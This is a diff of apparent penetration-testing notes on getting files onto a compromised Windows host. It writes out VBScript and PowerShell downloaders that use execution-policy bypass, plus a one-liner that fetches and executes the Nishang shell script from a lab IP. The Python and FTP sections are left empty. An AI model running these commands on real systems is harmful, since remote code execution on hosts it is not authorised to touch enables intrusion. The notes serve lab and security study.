@@ -14,11 +14,11 @@ net users
 
 ## Uploading files to the Windows machine  
 Most of the time we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  
-We will look at 3 ways of uploading files to a remote Windows machine from Kali Linux:  
+We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:  
 1. VBScript HTTP Downloader
 2. PowerShell HTTP Downloader
 3. Python HTTP Downloader
-3. Remote FTP Downloader
+4. FTP Downloader
 
 ### Uploading Files with VBScript  
 First lets test to see if we can run VBScript  
@@ -55,17 +55,43 @@ If Windows is a newer version (Windows 10 or Server 2016), try the following cod
 echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
 ```
 
+Now try to download a file to the local path:  
+```
+cscript dl.vbs "http://10.10.10.10/archive.zip"
+```
+
 ### Uploading Files with PowerShell  
 
+Test to see if we can run Powershell:
 ```
-(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
+```
+
+Test to see if we can run Powershell Version 2:
+```
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
+```
+
+Try to download a file from a remote server to the windows temp folder:
+```
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/archive.zip\", \"C:\Windows\Temp\archive.zip\")"
+
+```
+
+### Uploading Files with Python
+
+
+### Uploading Files with FTP
+
+
+## Upgrade Shell with PowerShell Nishang
+
+https://github.com/samratashok/nishang
+```
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/nishang.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\code\"
 ```
 
 
-Powershell Invoke Web Request:
-https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1
-
-Windows XP / Server 2003 / Windows 7
 
 
 *Easy*
